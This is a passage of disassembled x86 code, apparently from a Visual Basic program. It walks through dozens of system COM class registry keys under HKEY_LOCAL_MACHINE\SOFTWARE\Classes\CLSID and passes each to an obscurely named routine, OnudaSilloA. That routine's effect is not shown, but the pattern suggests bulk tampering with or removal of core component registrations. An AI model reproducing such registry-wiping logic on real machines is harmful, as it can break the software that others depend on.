  mov var_4, 0000044Ch
  push 004322B8h ; "SOFTWARE\Classes\CLSID\{00000609-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000044Dh
  push 0043236Ch ; "SOFTWARE\Classes\CLSID\{00000609-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000044Eh
  push 00432424h ; "SOFTWARE\Classes\CLSID\{00000609-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000044Fh
  push 004324C4h ; "SOFTWARE\Classes\CLSID\{00000609-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000450h
  push 00432544h ; "SOFTWARE\Classes\CLSID\{00000615-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000451h
  push 00432608h ; "SOFTWARE\Classes\CLSID\{00000615-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000452h
  push 00432698h ; "SOFTWARE\Classes\CLSID\{00000615-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000453h
  push 00432738h ; "SOFTWARE\Classes\CLSID\{00000615-0000-0010-8000-00AA006D2EA4}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000454h
  push 004327B8h ; "SOFTWARE\Classes\CLSID\{00000618-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000455h
  push 0043286Ch ; "SOFTWARE\Classes\CLSID\{00000618-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000456h
  push 004328FCh ; "SOFTWARE\Classes\CLSID\{00000618-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000457h
  push 0043299Ch ; "SOFTWARE\Classes\CLSID\{00000618-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000458h
  push 00432A1Ch ; "SOFTWARE\Classes\CLSID\{0000061B-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000459h
  push 00432AD0h ; "SOFTWARE\Classes\CLSID\{0000061B-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000045Ah
  push 00432B7Ch ; "SOFTWARE\Classes\CLSID\{0000061B-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000045Bh
  push 00432C1Ch ; "SOFTWARE\Classes\CLSID\{0000061B-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000045Ch
  push 00432C9Ch ; "SOFTWARE\Classes\CLSID\{0000061E-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000045Dh
  push 00432D60h ; "SOFTWARE\Classes\CLSID\{0000061E-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000045Eh
  push 00432DF0h ; "SOFTWARE\Classes\CLSID\{0000061E-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000045Fh
  push 00432E90h ; "SOFTWARE\Classes\CLSID\{0000061E-0000-0010-8000-00AA006D2EA4}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000460h
  push 00432F10h ; "SOFTWARE\Classes\CLSID\{00000621-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000461h
  push 00432FC4h ; "SOFTWARE\Classes\CLSID\{00000621-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000462h
  push 00433054h ; "SOFTWARE\Classes\CLSID\{00000621-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000463h
  push 004330F4h ; "SOFTWARE\Classes\CLSID\{00000621-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000464h
  push 00433174h ; "SOFTWARE\Classes\CLSID\{00020000-0000-0000-C000-000000000046}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000465h
  push 00433214h ; "SOFTWARE\Classes\CLSID\{00020000-0000-0000-C000-000000000046}\InprocServer"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000466h
  push 004332B0h ; "SOFTWARE\Classes\CLSID\{00020000-0000-0000-C000-000000000046}\AVIFile"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000467h
  push 00433340h ; "SOFTWARE\Classes\CLSID\{00020000-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000468h
  push 004333C0h ; "SOFTWARE\Classes\CLSID\{00020001-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000469h
  push 00433460h ; "SOFTWARE\Classes\CLSID\{00020001-0000-0000-C000-000000000046}\InprocServer"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000046Ah
  push 004334FCh ; "SOFTWARE\Classes\CLSID\{00020001-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000046Bh
  push 0043357Ch ; "SOFTWARE\Classes\CLSID\{00020003-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000046Ch
  push 0043361Ch ; "SOFTWARE\Classes\CLSID\{00020003-0000-0000-C000-000000000046}\AVIFile"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000046Dh
  push 004336ACh ; "SOFTWARE\Classes\CLSID\{00020003-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000046Eh
  push 0043372Ch ; "SOFTWARE\Classes\CLSID\{0002000D-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000046Fh
  push 004337CCh ; "SOFTWARE\Classes\CLSID\{0002000D-0000-0000-C000-000000000046}\InprocServer"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000470h
  push 00433868h ; "SOFTWARE\Classes\CLSID\{0002000D-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000471h
  push 004338E8h ; "SOFTWARE\Classes\CLSID\{0002000F-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000472h
  push 00433988h ; "SOFTWARE\Classes\CLSID\{0002000F-0000-0000-C000-000000000046}\InprocServer"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000473h
  push 00433A24h ; "SOFTWARE\Classes\CLSID\{0002000F-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000474h
  push 00433AA4h ; "SOFTWARE\Classes\CLSID\{00020420-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000475h
  push 00433B44h ; "SOFTWARE\Classes\CLSID\{00020420-0000-0000-C000-000000000046}\InprocServer"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000476h
  push 00433BE0h ; "SOFTWARE\Classes\CLSID\{00020420-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000477h
  push 00433C60h ; "SOFTWARE\Classes\CLSID\{00020421-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000478h
  push 00433D00h ; "SOFTWARE\Classes\CLSID\{00020421-0000-0000-C000-000000000046}\InprocServer"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000479h
  push 00433D9Ch ; "SOFTWARE\Classes\CLSID\{00020421-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000047Ah
  push 00433E1Ch ; "SOFTWARE\Classes\CLSID\{00020422-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000047Bh
  push 00433EBCh ; "SOFTWARE\Classes\CLSID\{00020422-0000-0000-C000-000000000046}\InprocServer"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000047Ch
  push 00433F58h ; "SOFTWARE\Classes\CLSID\{00020422-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000047Dh
  push 00433FD8h ; "SOFTWARE\Classes\CLSID\{00020423-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000047Eh
  push 00434078h ; "SOFTWARE\Classes\CLSID\{00020423-0000-0000-C000-000000000046}\InprocServer"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000047Fh
  push 00434114h ; "SOFTWARE\Classes\CLSID\{00020423-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000480h
  push 00434194h ; "SOFTWARE\Classes\CLSID\{00020424-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000481h
  push 00434234h ; "SOFTWARE\Classes\CLSID\{00020424-0000-0000-C000-000000000046}\InprocServer"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000482h
  push 004342D0h ; "SOFTWARE\Classes\CLSID\{00020424-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000483h
  push 00434350h ; "SOFTWARE\Classes\CLSID\{00020425-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000484h
  push 004343F0h ; "SOFTWARE\Classes\CLSID\{00020425-0000-0000-C000-000000000046}\InprocServer"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000485h
  push 0043448Ch ; "SOFTWARE\Classes\CLSID\{00020425-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000486h
  push 0043450Ch ; "SOFTWARE\Classes\CLSID\{00020810-0000-0000-C000-000000000046}\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000487h
  push 004345D8h ; "SOFTWARE\Classes\CLSID\{00020810-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000488h
  push 00434658h ; "SOFTWARE\Classes\CLSID\{00020811-0000-0000-C000-000000000046}\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000489h
  push 004346FCh ; "SOFTWARE\Classes\CLSID\{00020811-0000-0000-C000-000000000046}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000048Ah
  push 004347BCh ; "SOFTWARE\Classes\CLSID\{00020820-0000-0000-C000-000000000046}\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000048Bh
  push 00434860h ; "SOFTWARE\Classes\CLSID\{00020820-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000048Ch
  push 004348E0h ; "SOFTWARE\Classes\CLSID\{00020821-0000-0000-C000-000000000046}\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000048Dh
  push 004349A8h ; "SOFTWARE\Classes\CLSID\{00020821-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000048Eh
  push 00434A28h ; "SOFTWARE\Classes\CLSID\{00020900-0000-0000-C000-000000000046}\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000048Fh
  push 00434ACCh ; "SOFTWARE\Classes\CLSID\{00020900-0000-0000-C000-000000000046}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000490h
  push 00434B84h ; "SOFTWARE\Classes\CLSID\{00020906-0000-0000-C000-000000000046}\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000491h
  push 00434C28h ; "SOFTWARE\Classes\CLSID\{00020906-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000492h
  push 00434CA8h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\verb\2"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000493h
  push 00434D68h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\verb\1"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000494h
  push 00434DF8h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\verb\0"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000495h
  push 00434E88h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\verb"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000496h
  push 00434F50h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\ProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000497h
  push 00434FE0h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000498h
  push 00435084h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\MiscStatus"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000499h
  push 0043513Ch ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\LocalServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000049Ah
  push 004351D8h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\LocalServer"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000049Bh
  push 00435270h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\Insertable"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000049Ch
  push 00435328h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\InprocHandler32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000049Dh
  push 004353C8h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\Implemented Categories\{7DD95802-9882-11CF-9FA9-00AA006C42C4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000049Eh
  push 00435508h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\Implemented Categories\{7DD95801-9882-11CF-9FA9-00AA006C42C4}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000049Fh
  push 00435604h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\Implemented Categories"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004A0h
  push 004356F0h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats\GetSet\1"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004A1h
  push 0043579Ch ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats\GetSet\0"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004A2h
  push 004358E4h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats\GetSet"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004A3h
  push 0043598Ch ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats\DefaultSet"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004A4h
  push 00435AD8h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats\DefaultFile"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004A5h
  push 00435B88h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004A6h
  push 00435C20h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\AuxUserType\3"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004A7h
  push 00435A3Ch ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\AuxUserType\2"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004A8h
  push 00435848h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\AuxUserType"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004A9h
  push 00435CC8h ; "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004AAh
  push 00435D48h ; "SOFTWARE\Classes\CLSID\{4516EC41-8F20-11d0-9B6D-0000C0781BC3}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
